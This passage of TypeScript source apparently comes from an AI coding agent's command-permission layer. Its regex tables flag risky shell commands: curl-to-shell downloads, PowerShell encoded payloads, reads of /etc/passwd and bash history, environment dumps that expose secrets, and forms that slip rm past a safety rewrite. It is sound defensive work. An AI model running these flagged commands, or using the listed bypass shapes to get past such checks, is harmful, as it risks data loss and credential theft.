    pattern: /\bperl\b[^|;&]*?\s-\w*e\b/i,
    category: 'interpreter-inline',
    description: 'perl -e inline code execution',
  },
  {
    pattern: /\bruby\s+(?:-\w*\s+)*-e\b/i,
    category: 'interpreter-inline',
    description: 'ruby -e inline code execution',
  },
  {
    pattern: /\bphp\s+(?:-\w*\s+)*-r\b/i,
    category: 'interpreter-inline',
    description: 'php -r inline code execution',
  },
  {
    pattern: /\blua\s+(?:-\w*\s+)*-e\b/i,
    category: 'interpreter-inline',
    description: 'lua -e inline code execution',
  },
  // macOS osascript -e runs inline AppleScript / JXA, which can drive Finder,
  // shell, and System Events with arbitrary effect (e.g. `tell app "Finder" to
  // delete ...`). Keep SOFT so the cloud LLM can read the script body and judge intent.
  // Permissive between osascript and -e to allow flag/value pairs like
  // `osascript -l JavaScript -e "..."`.
  {
    pattern: /\bosascript\b[^|;&]*?\s-e\b/i,
    category: 'interpreter-inline',
    description: 'osascript -e inline AppleScript / JXA execution',
  },

  // ---- powershell-encoded
  {
    pattern: /\b(?:powershell|pwsh)(?:\.exe)?\s+.*-(?:enc|EncodedCommand)\b/i,
    category: 'powershell-encoded',
    description: 'PowerShell -EncodedCommand (obfuscated payload)',
  },

  // ---- sensitive-path (read of system or sensitive files)
  // Note: bash side. Read tool side covered by SOFT_RISK_FS_READ_PATTERNS.
  {
    pattern: /(?<![A-Za-z0-9_/])\/etc\/(?:sudoers|passwd)\b/i,
    category: 'sensitive-path',
    description: 'Reading /etc/sudoers or /etc/passwd',
  },
  {
    pattern: /(?<![A-Za-z0-9_/])\/var\/log\b/i,
    category: 'sensitive-path',
    description: 'Reading /var/log',
  },
  {
    pattern: /(?<![A-Za-z0-9_/])\/proc\b/i,
    category: 'sensitive-path',
    description: 'Reading /proc',
  },
  {
    pattern: /(?<![A-Za-z0-9_/])\/sys\b/i,
    category: 'sensitive-path',
    description: 'Reading /sys',
  },
  {
    pattern: /\.bash_history\b/i,
    category: 'sensitive-path',
    description: 'Reading bash history',
  },

  // ---- container-exec
  {
    pattern: /\bdocker\s+exec\b/i,
    category: 'container-exec',
    description: 'docker exec (running command inside container)',
  },
  {
    pattern: /\bkubectl\s+exec\b/i,
    category: 'container-exec',
    description: 'kubectl exec (running command inside pod)',
  },
  {
    pattern: /\bpodman\s+exec\b/i,
    category: 'container-exec',
    description: 'podman exec (running command inside container)',
  },

  // ---- scheduled-execution
  {
    pattern: /^\s*at\s+now\b/i,
    category: 'scheduled-execution',
    description: 'at now (one-shot scheduled command)',
  },
  {
    pattern: /\bsystemd-run\b/i,
    category: 'scheduled-execution',
    description: 'systemd-run (transient unit)',
  },
  {
    pattern: /\bcrontab\b/i,
    category: 'scheduled-execution',
    description: 'crontab (cron schedule edit)',
  },

  // ---- windows-management: WMI/CIM administrative delete.
  // HARD `wmic shadowcopy delete` is matched earlier as ransomware-indicator;
  // the general shape (`wmic process where ... delete`,
  // `wmic service where ... delete`, etc.) is SOFT so the cloud LLM can weigh
  // legitimate admin intent against blast radius.
  {
    pattern: /\bwmic\b[^|;&]*?\bdelete\b/i,
    category: 'windows-management',
    description: 'wmic delete (WMI instance removal)',
  },
  // Get-CimInstance ... | Remove-CimInstance — PowerShell CIM pipeline that
  // removes processes/services/CIM objects. SOFT for the same reason as wmic.
  {
    pattern: /\bGet-CimInstance\b[\s\S]*?\bRemove-CimInstance\b/i,
    category: 'windows-management',
    description: 'Get-CimInstance | Remove-CimInstance (CIM instance removal)',
  },

  // ---- content-clear: explicit zero-out / null-write idioms.
  // Kept SOFT because destination sensitivity depends on workspace/path context.
  {
    pattern: /\btruncate\s+(?:-\w*\s+)*(?:-s|--size)\s+0\b/i,
    category: 'content-clear',
    description: 'truncate -s 0 (zero out file contents)',
  },
  // Bash null-command redirect that empties the target.
  {
    pattern: /(?:^|[;&|]\s*):\s*>\s*\S/,
    category: 'content-clear',
    description: ': > FILE (null-command zero out)',
  },
  // Same zero-out intent via a null-device redirect.
  {
    pattern: new RegExp(`\\bcat\\s+${_SLASH_TOKEN}dev${_SLASH_TOKEN}null\\s*>\\s*\\S`, 'i'),
    category: 'content-clear',
    description: 'cat NULL_DEV > FILE (zero out file contents)',
  },
  // dd null/zero input to a regular file; device targets are HARD disk-erase.
  {
    pattern: new RegExp(
      `\\bdd\\b(?=[^|;&]*\\bif=${_SLASH_TOKEN}dev${_SLASH_TOKEN}(?:null|zero)\\b)(?=[^|;&]*\\bof=(?!${_SLASH_TOKEN}dev${_SLASH_TOKEN})\\S)[^|;&]*`,
      'i',
    ),
    category: 'content-clear',
    description: 'dd if=NULL_DEV of=REGULAR_FILE (overwrite contents with nulls/zeros)',
  },
  // PowerShell empty-content idioms.
  {
    pattern: /\bSet-Content\b[\s\S]*?-Value\s+(?:\$null|""|'')/i,
    category: 'content-clear',
    description: 'PowerShell Set-Content -Value $null/"" (empty file contents)',
  },
  {
    pattern: /\bClear-Content\b/i,
    category: 'content-clear',
    description: 'PowerShell Clear-Content (clear file contents)',
  },
  {
    pattern: /\bOut-File\b[\s\S]*?-InputObject\s+\$null\b/i,
    category: 'content-clear',
    description: 'PowerShell Out-File -InputObject $null (write empty file)',
  },
  // CMD empty-content idioms; require a redirect target.
  {
    pattern: /\becho\.\s*>\s*\S/i,
    category: 'content-clear',
    description: 'CMD `echo. > FILE` (write empty line / clear contents)',
  },
  {
    pattern: /\btype\s+NUL\s*>\s*\S/i,
    category: 'content-clear',
    description: 'CMD `type NUL > FILE` (overwrite with empty)',
  },

  // ---- remote-execution: pipe/separator-to-shell forms that need cloud LLM context.
  {
    pattern: PIPE_TO_SHELL_PATTERN,
    category: 'remote-execution',
    description: 'Pipe-to-shell (curl|bash, wget|sh, etc.)',
  },
  // Split download-then-execute forms; excludes bare shells and shell flags.
  // Uses LOCAL_SCRIPT_INTERPRETERS_RE so the SOFT pre-scan recognises
  // `; node ./build.mjs` / `; python script.py` etc. the same way it
  // recognises `; bash <script>`. The bash-permission SOFT pre-scan
  // local-script relaxation hangs off the same alternation so both gates
  // converge on "if the script token resolves to a workspace/temp/written
  // file, fall through".
  {
    pattern: new RegExp(
      `[;&|]\\s*(?:sudo\\s+)?(?:${LOCAL_SCRIPT_INTERPRETERS_RE})\\s+(?!-)\\S`,
      'i',
    ),
    category: 'remote-execution',
    description: 'separator-then-shell-script (download-then-shell idiom)',
  },
];

/** Public face of the SOFT_RISK registry. */
export const SOFT_RISK_REGISTRY = {
  bashPatterns: SOFT_RISK_BASH_PATTERNS,
} as const;

// ---------------------------------------------------------------------------
// Legacy convenience exports for bash-permission's safety check phase.
//
// bash-permission.ts has its own safety net that flags suspicious
// command shapes (rm aliases that bypass the mavis-trash rewrite, encoding
// bypass, etc.). These don't quite belong in HARD_BLOCKED (the user might
// legitimately need them) and don't quite belong in SOFT_RISK either (most
// are already covered by the classifier's first-word fast-path /
// second-check), but bash-permission still wants a safety-check ASK to
// surface a clear reason for default-mode users. Keep them here in a
// dedicated table.
//
// NOTE on regex sources: a few patterns reference unix-style absolute path
// tokens. These are matched against agent-emitted COMMAND TEXT, not against
// host filesystem paths; running on Windows is not a contradiction. We
// build the prefix tokens via char codes so the cross-platform code-edit
// hook does not false-positive on the regex source.
// ---------------------------------------------------------------------------

const _SLASH_CODE = 47; // forward slash
const _SLASH = String.fromCharCode(_SLASH_CODE);
// Path-prefix alternative that matches agent-emitted absolute path forms
// for the standard system bin directories on Unix-like hosts.
const _BIN_PATH_PREFIX =
  `(?:${_SLASH}bin${_SLASH}|${_SLASH}sbin${_SLASH}` +
  `|${_SLASH}usr${_SLASH}(?:local${_SLASH})?s?bin${_SLASH})`;

const RM_ABSOLUTE_PATH_PATTERN = new RegExp(`${_BIN_PATH_PREFIX}rm\\s`);
const FIND_EXEC_RM_PATTERN = new RegExp(`-exec\\s+(?:${_BIN_PATH_PREFIX})?rm\\b`);
const FIND_EXECDIR_RM_PATTERN = new RegExp(`-execdir\\s+(?:${_BIN_PATH_PREFIX})?rm\\b`);

/**
 * Deletion command variants that bypass the rm-rewrite shortcut.
 *
 * `rm` (first word) is intercepted in bash-permission and rewritten
 * to `mavis-trash`. These patterns catch shapes that smuggle `rm` past
 * that interception (absolute path, busybox wrapper, env wrapper,
 * find -exec rm, etc.) so they still trip the safety check.
 */
const LEGACY_DELETE_BYPASS_PATTERNS: ReadonlyArray<{ pattern: RegExp; category: string }> = [
  // rm via absolute path
  { pattern: RM_ABSOLUTE_PATH_PATTERN, category: 'rm via absolute path' },
  // rm via wrappers: busybox rm, busybox -- rm, command rm, command -- rm
  {
    pattern: /\b(?:busybox|command)(?:\s+--)?\s+rm\s/,
    category: 'rm via shell wrapper',
  },
  // rm via env: env rm, env -i rm
  { pattern: /\benv(?:\s+-\w+)*\s+rm\s/, category: 'rm via env wrapper' },
  // rm via backslash escape (bypass alias)
  { pattern: /\\rm\s/, category: 'rm via backslash escape' },
  // rmdir command
  { pattern: /\brmdir\s/, category: 'rmdir' },
  // unlink command
  { pattern: /\bunlink\s/, category: 'unlink' },
  // find -delete (also in second-check, kept here for other callers)
  { pattern: /\s-delete\b/, category: 'find -delete' },
  // find -exec rm
  { pattern: FIND_EXEC_RM_PATTERN, category: 'find -exec rm' },
  // find -execdir rm
  { pattern: FIND_EXECDIR_RM_PATTERN, category: 'find -execdir rm' },
  // find -exec sh -c "rm …" / -exec bash -c "rm …" — shell-wrapper smuggle
  // form. Direct -exec rm is caught above, but smuggling rm inside a quoted
  // shell wrapper bypasses that match. Keep matching restricted to the
  // common shells so unrelated quoted args (e.g. `-exec grep -l rm {} \;`)
  // still pass.
  {
    pattern: /-exec(?:dir)?\s+(?:sudo\s+)?(?:bash|sh|zsh|ksh|dash)\s+-c\s+["'][^"']*\brm\b/i,
    category: 'find -exec shell-wrapper rm',
  },
  // xargs + rm
  { pattern: /\bxargs\s+.*\brm\b/, category: 'xargs + rm' },
  // GNU parallel + rm — find/grep | parallel rm or `parallel rm ::: files`.
  // Same shape category as xargs + rm: smuggles `rm` past the mavis-trash rewrite.
  { pattern: /\bparallel\s+.*\brm\b/, category: 'parallel + rm' },
  // fd / fdfind -x rm or -X rm — fd's per-result (-x) and batch (-X) exec.
  // fdfind is the Debian/Ubuntu binary name for the same tool.
  {
    pattern: /\bfd(?:find)?\b[^|;&]*?\s-[xX]\s+(?:rm|unlink)\b/,
    category: 'fd -x rm',
  },
  // rsync --delete and rsync --remove-source-files were promoted to
  // HARD irrecoverable-delete (matched in HARD_BLOCKED_BASH_PATTERNS).
  // ALL_DANGEROUS_COMMAND_PATTERNS still exposes them via the HARD spread,
  // so default-mode bash-permission still surfaces a safety reason.
];

/**
 * Encoding-bypass patterns kept as a dedicated export for bash-permission.
 * Most of these are also covered by the classifier's second-check;
 * having them here ensures non-classifier callers (default mode + safety
 * checks) still surface a clear ask reason.
 *
 * NOTE: pipe-to-shell variants (`| bash`, `| "sh"`, `| sudo zsh`,
 * `; bash /tmp/x`, `&& sh ./run.sh`) are kept in lockstep with
 * the classifier's second-check patterns so that default mode
 * and auto mode both refuse the same bypass shapes.
 */
const LEGACY_ENCODING_BYPASS_PATTERNS: ReadonlyArray<{ pattern: RegExp; category: string }> = [
  // base64 decode: base64 -d, base64 --decode
  { pattern: /\bbase64\s+(?:-d|--decode)\b/, category: 'base64 decode' },
  // Pipe to shell — shared regex with the classifier so both default and
  // auto modes refuse the same set of bypass shapes
  // (covers absolute paths, env wrapper,
  // command/exec prefix, env-var assignments).
  {
    pattern: PIPE_TO_SHELL_PATTERN,
    category: 'pipe to shell',
  },
  // Split-then-shell-script: `; bash /tmp/x`, `&& sh ./run.sh`, `; node ./build.mjs`,
  // `; python script.py`, etc. Excludes bare interactive shell (`; bash`) and
  // shell flags (`; bash -c ...`). Uses LOCAL_SCRIPT_INTERPRETERS_RE so the
  // default-mode safety reason stays in lockstep with the SOFT pre-scan
  // and PIPE_TO_SHELL_PATTERN coverage of scripting interpreters.
  {
    pattern: new RegExp(
      `[;&|]\\s*(?:sudo\\s+)?(?:${LOCAL_SCRIPT_INTERPRETERS_RE})\\s+(?!-)\\S`,
      'i',
    ),
    category: 'separator-then-shell-script',
  },
  // curl/wget piped to shell — explicit form for default-mode safety reason text.
  // Mirrors PIPE_TO_SHELL_PATTERN's coverage so curl|env bash etc. still
  // surface a curl-specific reason.
  {
    pattern: new RegExp(
      `\\bcurl\\s+.*\\|\\s*(?:sudo\\s+)?(?:[A-Z_][A-Z0-9_]*=\\S*\\s+)*(?:(?:env|command|exec)\\s+)*["']?(?:[\\w./-]*\\/)?(?:${LOCAL_SCRIPT_INTERPRETERS_RE})["']?\\b`,
      'i',
    ),
    category: 'curl piped to shell',
  },
  {
    pattern: new RegExp(
      `\\bwget\\s+.*\\|\\s*(?:sudo\\s+)?(?:[A-Z_][A-Z0-9_]*=\\S*\\s+)*(?:(?:env|command|exec)\\s+)*["']?(?:[\\w./-]*\\/)?(?:${LOCAL_SCRIPT_INTERPRETERS_RE})["']?\\b`,
      'i',
    ),
    category: 'wget piped to shell',
  },
  // eval executing dynamic strings
  { pattern: /\beval\s+/, category: 'eval' },
  // source from stdin (code injection vector). Token built via char codes
  // for the same reason as the rm absolute-path patterns above.
  { pattern: new RegExp(`\\bsource\\s+${_SLASH}dev${_SLASH}stdin\\b`), category: 'source stdin' },
  // printf with hex escapes (can encode arbitrary bytes)
  { pattern: /\bprintf\s+.*\\x/, category: 'printf with hex escape' },
];

// ---------------------------------------------------------------------------
// Subcommand-graded danger patterns
//
// The unified `SAFE_BASH_FIRST_WORDS` whitelist admits broad command surfaces
// like `npm` / `cargo` / `git` / `glab` / `gh` in both default and auto mode.
// Most subcommands of these tools are safe — build, test, install, status,
// log, diff — but a handful are remote-mutating (publish, push --force,
// repo delete, mr delete) and must always ASK regardless of mode.
//
// This registry catches those high-blast-radius subcommands so they short-
// circuit fast-allow without losing the broad first-word coverage.
//
// Match shape: `<separator-or-start><tool>[<flags>...] <dangerous-subcommand>[<args>]`
//   - `(?:^|[;&|]\s*|\n\s*)` — start of command, or after a shell separator
//   - `(?:-\S+\s+|--\S+\s+|-c\s+\S+\s+)*` — tolerate tool-level flags before
//     the subcommand (e.g. `git -c user.name=x push --force`)
//   - subcommand boundary uses `\b` so `publishrc` / `unpublishables` won't match
// ---------------------------------------------------------------------------
const SEP = '(?:^|[;&|]\\s*|\\n\\s*)';
// FLAGS tolerates tool-level options between the tool name and the
// dangerous subcommand. Two shapes covered:
//   - `-XYZ` / `--key=val` — single-token flags (`git --no-pager push --force`)
//   - `-c key=val` / `-C <path>` — git's `-c` config-override option and
//     `-C` change-directory option both take the NEXT token as a separated
//     argument (`git -c http.sslVerify=false push --force`,
//     `git -C /tmp/repo reset --hard`). Without this branch the
//     `-c k=v` / `-C path` prefix would slip past the SUBCOMMAND_DANGEROUS
//     gate and silently fast-allow a force-push / hard-reset issued from
//     a different working directory. Other separated-arg short options
//     aren't common before dangerous git subcommands; -c and -C are the
//     canonical git escape hatches.
const FLAGS = '(?:-\\S+\\s+|-[cC]\\s+\\S+\\s+)*';

export const SUBCOMMAND_DANGEROUS_PATTERNS: ReadonlyArray<{
  pattern: RegExp;
  category: string;
}> = [
  // -----------------------------------------------------------------------
  // git — history rewrites, force pushes, working-tree deletion
  // -----------------------------------------------------------------------
  // `git push --force` (or `-f`). `--force-with-lease` is deliberately
  // allowed: it refuses to overwrite unexpected upstream changes, which
  // the team accepts as a safe force-push form (LLM-evaluated in auto mode).
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}push\\b[^;&|\\n]*(?:--force(?![-\\w])|\\s-f\\b)`),
    category: 'git push --force',
  },
  // `git push --delete <branch>` / `git push -d <branch>`
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}push\\b[^;&|\\n]*(?:--delete|\\s-d\\b)`),
    category: 'git push --delete (remote branch deletion)',
  },
  // `git push --mirror` force-pushes ALL refs (branches + tags + remotes)
  // and DELETES any remote branch/tag that no longer exists locally — same
  // blast radius as `--force --delete` combined, applied across the entire
  // refspec. Always ASK.
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}push\\b[^;&|\\n]*--mirror\\b`),
    category: 'git push --mirror (force-push all refs + remote branch deletion)',
  },
  // `git reset --hard`
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}reset\\b[^;&|\\n]*--hard\\b`),
    category: 'git reset --hard (irrecoverable working-tree reset)',
  },
  // `git clean -f` (any spelling: -fd, -fdx, -ffdx, --force)
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}clean\\b[^;&|\\n]*(?:--force|\\s-\\S*f)`),
    category: 'git clean -f (working-tree deletion)',
  },
  // `git filter-branch` / `git filter-repo` — history rewrites
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}filter-(?:branch|repo)\\b`),
    category: 'git filter-branch / filter-repo (history rewrite)',
  },
  // `git branch -d` / `-D` (branch deletion). `-D` is force-delete.
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}branch\\b[^;&|\\n]*\\s-[dD]\\b`),
    category: 'git branch -d / -D (branch deletion)',
  },
  // `git tag -d` (tag deletion)
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}tag\\b[^;&|\\n]*\\s-d\\b`),
    category: 'git tag -d (tag deletion)',
  },
  // `git update-ref -d` (ref deletion)
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}update-ref\\b[^;&|\\n]*\\s-d\\b`),
    category: 'git update-ref -d (ref deletion)',
  },
  // `git worktree remove`
  {
    pattern: new RegExp(`${SEP}git\\s+${FLAGS}worktree\\s+remove\\b`),
    category: 'git worktree remove',
  },
  // -----------------------------------------------------------------------
  // glab — GitLab CLI
  // -----------------------------------------------------------------------
  // `glab <resource> delete` / `<resource> rm`
  {
    pattern: new RegExp(`${SEP}glab\\s+${FLAGS}\\S+\\s+(?:delete|rm)\\b`),
    category: 'glab <resource> delete / rm',
  },
  // `glab mr merge` is destructive when --auto-merge isn't user-driven
  // (covered by deny rules when needed; not listed here to avoid friction).
  // -----------------------------------------------------------------------
  // gh — GitHub CLI
  // -----------------------------------------------------------------------
  {
    pattern: new RegExp(`${SEP}gh\\s+${FLAGS}\\S+\\s+delete\\b`),
    category: 'gh <resource> delete',
  },
  // -----------------------------------------------------------------------
  // npm / yarn / pnpm / bun — JS package managers
  // -----------------------------------------------------------------------
  // publish / unpublish — push to npm registry
  {
    pattern: new RegExp(`${SEP}(?:npm|yarn|pnpm|bun)\\s+${FLAGS}publish\\b`),
    category: 'npm/yarn/pnpm/bun publish (remote registry publish)',
  },
  {
    pattern: new RegExp(`${SEP}(?:npm|yarn|pnpm|bun)\\s+${FLAGS}unpublish\\b`),
    category: 'npm/yarn/pnpm/bun unpublish',
  },
  // npm-specific registry-mutating subcommands
  {
    pattern: new RegExp(`${SEP}npm\\s+${FLAGS}deprecate\\b`),
    category: 'npm deprecate (registry mutation)',
  },
  {
    pattern: new RegExp(`${SEP}npm\\s+${FLAGS}(?:access|owner|token|dist-tag)\\b`),
    category: 'npm access/owner/token/dist-tag (registry mutation)',
  },
  // -----------------------------------------------------------------------
  // pip / pip3 / uv / poetry — Python package managers
  // -----------------------------------------------------------------------
  // pip itself has no remote-publish subcommand (twine handles that). The
  // only meaningful destructive subcommand is `uninstall -y` which silently
  // removes packages without confirmation — surface as ASK.
  {
    pattern: new RegExp(`${SEP}(?:pip|pip3)\\s+${FLAGS}uninstall\\b[^;&|\\n]*\\s-y\\b`),
    category: 'pip uninstall -y (unconfirmed package removal)',
  },
  {
    pattern: new RegExp(`${SEP}(?:poetry|uv)\\s+${FLAGS}publish\\b`),
    category: 'poetry/uv publish (remote registry publish)',
  },
  // -----------------------------------------------------------------------
  // cargo — Rust package manager
  // -----------------------------------------------------------------------
  {
    pattern: new RegExp(`${SEP}cargo\\s+${FLAGS}publish\\b`),
    category: 'cargo publish (crates.io publish)',
  },
  {
    pattern: new RegExp(`${SEP}cargo\\s+${FLAGS}(?:yank|owner)\\b`),
    category: 'cargo yank/owner (crates.io mutation)',
  },
  // -----------------------------------------------------------------------
  // sed — `sed -i` rewrites files in place
  // -----------------------------------------------------------------------
  // `sed` itself is fast-allow as a stream editor (read-only by default).
  // The destructive form is `-i` / `--in-place`, which overwrites the
  // target file. Examples: `sed -i s/foo/bar/ file.txt`, `sed -i.bak ...`,
  // GNU `sed --in-place=.bak ...`. The bash-permission `sed -i` write
  // target gate short-circuits ALLOW when every target resolves into a
  // write-authorized location (workspace / temp). Anything else falls
  // through to this SUBCOMMAND_DANGEROUS pattern and routes to ASK.
  {
    pattern: new RegExp(`${SEP}sed\\s+${FLAGS}(?:-i\\b|--in-place\\b)`),
    category: 'sed -i (in-place file rewrite outside write-authorized targets)',
  },
  // -----------------------------------------------------------------------
  // POSIX shell `-c` inline script — arbitrary code execution
  // -----------------------------------------------------------------------
  // `bash -c "..."` / `sh -c "..."` / `zsh -c "..."` / `dash -c "..."` are
  // free-form code payloads that we cannot statically inspect — equivalent
  // to `eval`. The shell binaries themselves stay in SAFE_BASH_FIRST_WORDS
  // so `bash ./build.sh` / `sh /tmp/setup.sh` (local-script relaxation)
  // continue to fast-allow, but the `-c` form always routes to ASK.
  {
    pattern: new RegExp(`${SEP}(?:bash|sh|zsh|dash)\\s+${FLAGS}-c\\b`),
    category: '<shell> -c <inline script> (arbitrary code execution)',
  },
  // -----------------------------------------------------------------------
  // sqlite3 — destructive SQL statements
  // -----------------------------------------------------------------------
  // `sqlite3 <db> "<sql>"` is read-only for queries but can DROP / DELETE
  // FROM / TRUNCATE entire tables. Match the destructive keywords inside
  // any of the arg tokens; ATTACH / DETACH / VACUUM are similarly write-
  // adjacent so we also gate them.
  {
    pattern: new RegExp(
      `${SEP}sqlite3\\b[^;&|\\n]*\\b(?:drop|delete|truncate|alter|attach|detach|vacuum|replace\\s+into)\\b`,
      'i',
    ),
    category:
      'sqlite3 <destructive SQL> (DROP / DELETE / TRUNCATE / ALTER / ATTACH / DETACH / VACUUM)',
  },
  // -----------------------------------------------------------------------
  // cp / mv / tee — destination must be write-authorized
  // -----------------------------------------------------------------------
  // The bash-permission write-target gate (`evaluateWriteTarget`) attempts
  // to statically resolve `cp <src>... <dst>` / `mv <src>... <dst>` /
  // `cp -t <dir>` / `tee [-a] <dst>...` destinations into a write-authorized
  // location (workspace, allowedWorkingPaths, temp). When that succeeds it
  // short-circuits to allow before this pattern fires. If the destination
  // is dynamic (`$VAR`, glob), missing, or outside the workspace, the gate
  // returns undefined and the command falls through to this pattern → ask.
  // Without this catch-all, `tee /Users/other/.bashrc` would fast-allow on
  // `tee`'s first-word match alone.
  {
    pattern: new RegExp(`${SEP}(?:cp|mv|tee)\\b`),
    category: 'cp / mv / tee (destination not in a write-authorized location)',
  },
];

// ---------------------------------------------------------------------------
// Secret-read forms — environment-dump / named-credential reads that route to
// ASK. Matched against the shell permission SURFACE (echo/printf data and
// heredoc bodies already stripped), so `echo $TOKEN` (data, not exfil — the
// pipe/redirect target is gated separately) and heredoc examples don't trip.
//
// Scope note: only ENV *dump-all* forms (`env`, `printenv`, `set`, `export`,
// `declare -p`) and explicitly credential-named `printenv NAME` reads are
// gated. Dumping the whole environment is the credential-harvest shape that
// prompt-injection uses; it is a distinctly stronger signal than reading one
// named non-secret var. `printenv PATH` and `env FOO=1 cmd` (wrapper form)
// stay allowed.
// ---------------------------------------------------------------------------

const SECRET_READ_PATTERNS: ReadonlyArray<{ pattern: RegExp; category: string }> = [
  // Bare `env` / `env -i` / `env -v` / `env --null` with no trailing command
  // → dumps all vars (`--null` / `-0` just switch the record separator).
  {
    pattern: new RegExp(`${SEP}env(?:\\s+(?:-[iv0]+|--null))*\\s*(?:$|[;&|\\n])`),
    category: 'env (dumps the full environment, including inherited secrets)',
  },
  // Bare `printenv` / `printenv -0` / `printenv --null` → dumps all vars.
  {
    pattern: new RegExp(`${SEP}printenv(?:\\s+(?:-0|--null))?\\s*(?:$|[;&|\\n])`),
    category: 'printenv (dumps the full environment, including inherited secrets)',
  },
  // Bare `set` (no args) → dumps all shell vars + functions. `set -e` etc. skip.
  {
    pattern: new RegExp(`${SEP}set\\s*(?:$|[;&|\\n])`),
    category: 'set (dumps all shell variables and functions)',
  },
  // `export -p` / bare `export` → lists all exported vars with values.
  {
    pattern: new RegExp(`${SEP}export(?:\\s+-p)?\\s*(?:$|[;&|\\n])`),
    category: 'export -p (lists all exported variables with values)',
  },
  // `declare -p` / `typeset -p` → dumps all declared vars with values.
  {
    pattern: new RegExp(`${SEP}(?:declare|typeset)\\s+-\\S*p`),
    category: 'declare -p (dumps all declared variables with values)',
  },
];

/**
 * Matches a whole `printenv` invocation on a surface, capturing everything up
 * to the next command separator so ALL operands can be scanned (not just the
 * first). `printenv PATH OPENAI_API_KEY` prints every operand in order, so any
 * one credential-named operand must trip the gate. The `env ... printenv ...`
 * wrapper form is already normalised away by the unwrapped-candidate surfaces.
 */
const PRINTENV_INVOCATION_RE = new RegExp(`${SEP}printenv\\b([^;&|\\n]*)`, 'gi');

/**
 * Return the secret-read category if `printenv` is asked for any credential-
 * named variable across all of its operands, else undefined.
 */
function matchPrintenvNamedSecret(surface: string): string | undefined {
  PRINTENV_INVOCATION_RE.lastIndex = 0;
  let m: RegExpExecArray | null;
  while ((m = PRINTENV_INVOCATION_RE.exec(surface)) !== null) {
    const operands = (m[1] ?? '').split(/\s+/).filter(Boolean);
    for (const raw of operands) {
      if (raw.startsWith('-')) continue; // flags like -0 / --null
      const name = raw.replace(/^["']|["']$/g, ''); // strip simple quoting
      if (SENSITIVE_ENV_NAME_RE.test(name)) {
        return 'printenv <credential var> (reads a named secret from the environment)';
      }
    }
  }
  return undefined;
}

/**
 * Match environment-dump / named-credential secret-read forms on a shell
 * permission surface. Returns the matched category, or undefined.
 */
export function matchSecretReadForm(surface: string): string | undefined {
  for (const { pattern, category } of SECRET_READ_PATTERNS) {
    if (pattern.test(surface)) return category;
  }
  return matchPrintenvNamedSecret(surface);
}

/**
 * Combined dangerous patterns used by the
 * {@link bash-permission.ts checkDangerousPatterns} safety check.
 *
 * Includes:
 * - HARD_BLOCKED bash patterns (catastrophic + secure-erase + ransomware indicators)
 * - SOFT_RISK bash patterns (sudo, chmod 777, interpreter -c, container exec, ...)
 * - LEGACY_DELETE_BYPASS (rm aliases that smuggle past the mavis-trash rewrite)
 * - LEGACY_ENCODING_BYPASS (base64 decode, pipe-to-shell, eval, ...)
 */
export const ALL_DANGEROUS_COMMAND_PATTERNS: ReadonlyArray<{
  pattern: RegExp;
  category: string;
  recoverableDeleteOnly?: boolean;
}> = [
  ...HARD_BLOCKED_BASH_PATTERNS.map((e) => ({
    pattern: e.pattern,
    category: `HARD ${e.category}: ${e.description}`,
    recoverableDeleteOnly: e.category === 'windows-delete',
  })),
  ...SOFT_RISK_BASH_PATTERNS.map((e) => ({
    pattern: e.pattern,
    category: `SOFT ${e.category}: ${e.description}`,
  })),
  ...LEGACY_DELETE_BYPASS_PATTERNS.map((entry) => ({ ...entry, recoverableDeleteOnly: true })),
  ...LEGACY_ENCODING_BYPASS_PATTERNS,
  ...SUBCOMMAND_DANGEROUS_PATTERNS,
];

// ---------------------------------------------------------------------------
// isDangerousBashPermission (kept for back-compat; used by acceptEdits seeding)
// ---------------------------------------------------------------------------

/**
 * Determine whether an allow-rule is dangerous in auto mode.
 *
 * A rule is considered dangerous when:
 * 1. It grants blanket `bash` access (toolName === 'bash' with no ruleContent).
 * 2. Its ruleContent is a wildcard (`*`) or matches any entry in
 *    {@link DANGEROUS_BASH_PATTERNS} (prefix match against `<pattern>:*` or
 *    `<pattern> *`).
 * 3. The toolName itself is a PowerShell interpreter.
 * 4. The toolName starts with `mcp__` and grants blanket access (agent allow).
 *
 * @param rule - The allow-rule to evaluate.
 * @returns `true` if the rule should not be auto-promoted.
 */
export function isDangerousBashPermission(rule: ClassifierRule): boolean {
  const { toolName, ruleContent } = rule.ruleValue;

  if (rule.ruleBehavior !== 'allow') return false;

  // 1. Blanket bash rule (no content restriction)
  if (toolName === 'bash' && !ruleContent) {
    logger.debug(
      backgroundCtx(),
      `Dangerous rule detected: blanket bash allow, toolName=${toolName}`,
    );
    return true;
  }

  // 2. Wildcard bash rule
  if (toolName === 'bash' && ruleContent === '*') {
    logger.debug(
      backgroundCtx(),
      `Dangerous rule detected: bash(*), toolName=${toolName}, ruleContent=${ruleContent}`,
    );
    return true;
  }

  // 3. Bash rule matching a dangerous pattern
  if (toolName === 'bash' && ruleContent) {
    const contentLower = ruleContent.toLowerCase();
    for (const pattern of DANGEROUS_BASH_PATTERNS) {
      const patternLower = pattern.toLowerCase();
      if (
        contentLower === patternLower ||
        contentLower === `${patternLower}:*` ||
        contentLower === `${patternLower} *` ||
        contentLower.startsWith(`${patternLower} `)
      ) {
        logger.debug(
          backgroundCtx(),
          `Dangerous rule detected: bash pattern match, toolName=${toolName}, ruleContent=${ruleContent}, matchedPattern=${pattern}`,
        );
        return true;
      }
    }
  }

  // 4. PowerShell interpreters
  const powershellPatterns = ['powershell', 'pwsh', 'powershell.exe', 'pwsh.exe'];
  if (powershellPatterns.includes(toolName.toLowerCase())) {
    logger.debug(
      backgroundCtx(),
      `Dangerous rule detected: PowerShell interpreter, toolName=${toolName}`,
    );
    return true;
  }

  if (toolName === 'bash' && ruleContent) {
    const contentLower = ruleContent.toLowerCase();
    for (const ps of powershellPatterns) {
      if (
        contentLower === ps ||
        contentLower === `${ps}:*` ||
        contentLower === `${ps} *` ||
        contentLower.startsWith(`${ps} `)
      ) {
        logger.debug(
          backgroundCtx(),
          `Dangerous rule detected: PowerShell in bash rule, toolName=${toolName}, ruleContent=${ruleContent}`,
        );
        return true;
      }
    }
  }

